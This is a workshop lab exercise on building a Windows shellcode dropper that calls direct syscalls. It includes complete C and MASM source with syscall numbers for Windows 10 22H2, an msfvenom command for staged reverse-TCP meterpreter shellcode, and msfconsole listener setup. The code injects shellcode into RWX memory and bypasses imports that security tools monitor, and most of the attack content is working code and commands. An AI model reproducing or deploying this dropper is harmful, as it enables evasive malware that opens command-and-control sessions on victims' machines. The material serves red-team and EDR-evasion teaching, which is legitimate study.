## LAB Exercise 4: Low Level Dropper-Direct Syscall
In this exercise we will make the second modification to the reference dropper, create the direct syscall dropper and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). We call this the Low Level Direct Syscall Dropper, or syscall dropper for short. 
![low_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235438881-e4af349a-0109-4d8e-80e2-730915c927f6.png)

## Exercise 4 Tasks:
### Creating the Direct Syscall Dropper 
1. Download the Syscall Dropper POC from the Code section of this chapter.
2. Most of the code is already implemented in the POC. But take a look at the .asm file and add the missing assembler code for the remaining three native APIs following the scheme of the already implemented code for the NTallocateVirtualMemory native API. 
3. Create x64 calc shellcode with msfvenom, copy it to the POC, compile it and run it for the first time. Check if the calc.exe spawns correctly. 
4. Create a staged x64 meterpreter shellcode with msfvenom and copy it to the POC or replace the calc shellcode with it.  
5. Compile the POC as a x64 release. 
6. Create and run a staged x64 meterpreter listener using msfconsole.
7. Run your compiled .exe and check that a stable command and control channel opens. 
### Analysing the Direct Syscall Dropper
8. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Is the result what you expected?  
9. Use the **API Monitor** tool to analyse the syscall dropper in the context of the four APIs used. Is the result what you expected? 
10. Use the **x64dbg** debugger to analyse syscall droppers: from which module and location are the syscalls of the four APIs used executed? Is the result what you expected? 

## Visual Studio
You can download the POC from the code section of this chapter. The code works as follows, shellcode declaration is the same as before in both droppers.
<details>
    
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
    
</details>


The main code of the direct syscall dropper looks like the following and is already implemented in the POC. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
<details>
<summary>Code</summary>
    
```
#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);


    // Return 0 as the main function exit code
    return 0;
}
```
    
</details>

    
### Header File
Unlike the mid-level dropper (NTAPIs), we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called syscalls.h and must also be included in the main code. The syscalls.h does not currently exist in the syscall POC folder, but must be added as a new header file to the syscall dropper POC. You will also need to include ``syscalls.h`` in the main C code. The code for the ``syscalls.h`` file can be found in the Code section below. Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtWriteVirtualMemory] (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory).

<details>
<summary>Code</summary>

```
#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include <windows.h>  // Include the Windows API header

#ifdef __cplusplus   // If this header file is included in a C++ file, then this section will be true
extern "C" {         // This is to ensure that the names of the functions are not mangled by the C++ compiler and are in C linkage format
#endif

    // The type NTSTATUS is typically defined in the Windows headers as a long.
    typedef long NTSTATUS;  // Define NTSTATUS as a long
    typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

    // Declare the function prototype for NtAllocateVirtualMemory
    extern NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
        PVOID* BaseAddress,      // Pointer to the base address
        ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
        PSIZE_T RegionSize,      // Pointer to the size of the region
        ULONG AllocationType,    // Type of allocation
        ULONG Protect            // Memory protection for the region of pages
    );

    // Declare the function prototype for NtWriteVirtualMemory
    extern NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,     // Handle to the process in which to write the memory
        PVOID BaseAddress,        // Pointer to the base address
        PVOID Buffer,             // Buffer containing data to be written
        SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
        PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );

    // Declare the function prototype for NtCreateThreadEx
    extern NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
        ACCESS_MASK DesiredAccess,   // Desired access to the thread
        PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
        HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
        PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
        PVOID lpParameter,           // Pointer to a variable to be passed to the thread
        ULONG Flags,                 // Flags that control the creation of the thread
        SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
        SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
        SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
        PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
    );

    // Declare the function prototype for NtWaitForSingleObject
    extern NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,          // Handle to the object to be waited on
        BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
        PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute```c
        // or relative time at which the function should return, regardless of the state of the object
    );

#ifdef __cplusplus  // End of the 'extern "C"' block if __cplusplus was defined
}
#endif

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
  
```
    
</details>
    
<details>
<summary>Solution</summary>   
    <p align="center">
<img width="300" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/5fbb39c6-be30-4641-8652-6b98e478e17f">    
    </p>
</details>     
    

    
### Assembly Instructions
Furthermore, we do not want to ask ntdll.dll for the syscall stub or the contents of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we want to manually implement the necessary assembly code in the assembly itself. As mentioned above, instead of using a tool like SysWhispers3 to create the necessary assembly instructions, for the best learning experience, we will manually implement the assembly code in our syscall POC. To do this, you will find a file called ``syscalls.asm`` in the syscall dropper POC, which contains some of the required assembler code. The code needed to implement the syscall stub in syscalls.asm looks like this and can be used as a template to add the syscall stub for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. It is one of your tasks to complete the missing assembler code.

<details>
<summary>Code</summary>

```
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP     
END  ; End of the module    
```
    
</details>

If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **syscall dropper POC**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
    
<details>
    <summary>Solution</summary>

```
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.

; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3AH
    syscall
    ret
NtWriteVirtualMemory ENDP

; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    syscall
    ret
NtCreateThreadEx ENDP

; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, 4
    syscall
    ret
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>

    
    
### Microsoft Macro Assembler (MASM)
We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the syscall POC, we need to do a few things. These steps are not done in the downloadable POC and must be done manually. First, we need to enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build Customisations.
<details>
 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

Furthermore we need to set the Item Type of the syscalls.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. Furthermore we set Excluded from Build to no and Content to yes. 
<details>
    <p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
    </p>
</details>     

    

## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the Low-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our Low-Level-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled Low-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>
        

    
## Low-Level-Dropper analysis: dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports low_level.exe
```
</details>    

<details>
    <summary>Solution</summary>  
    
**No imports** from the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
<p align="center">
<img width="1023" alt="image" src="https://user-images.githubusercontent.com/50073731/235473764-c85ccc73-a1cb-403d-8162-172146375d96.png">
</p>
</details>   
    
    
## Low-Level-Dropper analysis: API-Monitor
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in the context of the used APIs in our Medium-Level-Dropper. We filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

<details>
    <summary>Solution</summary>    
If everything was done correctly, you could see that the four used Windows APIs and their native APIs are no longer imported from kernel32.dll and ntdll.dll to the Low-Level-Dropper.exe.
This result was expected and is correct because our Low-Level-Dropper has directly implemented the necessary syscalls or syscall stubs for the respective native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject.
<p align="center">
<img width="595" alt="image" src="https://user-images.githubusercontent.com/50073731/235480936-df805736-aad8-44a7-8bec-f8563735d1d2.png">
</p>
</details>    

## Low-Level-Dropper analysis: x64dbg 
Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
Remember, now we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
<details>
    <summary>Solution</summary>
    
1. Open or load your Low-Level-Dropper.exe into x64dbg
2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight your **Low-Level-Dropper.exe**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. Compared to the High-Level-Dropper and the Medium-Level-Dropper we can see that the symbols for the used native APIs are implemented directly in the dropper itself and not imported from the ntdll.dll.
    
<p align="center">    
<img width="979" alt="image" src="https://user-images.githubusercontent.com/50073731/235481553-012459f5-1284-44ed-b3ed-2b04bfcccd3b.png">
</p>
    
As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are no longer 
imported from the .text section in the ntdll.dll module. Instead the syscalls or syscalls stubs are directly implemtented into the .text section of the Low-Level-Dropper itself.
    
<p align="center">    
<img width="990" alt="image" src="https://user-images.githubusercontent.com/50073731/235482389-35cd8c12-593e-4089-b082-8eaf2ba6636a.png"></p>    
</details>


## Summary:
- Made transition from medium to low level or from Native APIs to direct syscalls
- Dropper imports no longer Windows APIs from kernel32.dll
- Dropper imports no longer Native APIs from ntdll.dll
- Syscalls or syscall stubs are "implemented" directly into .text section of .exe
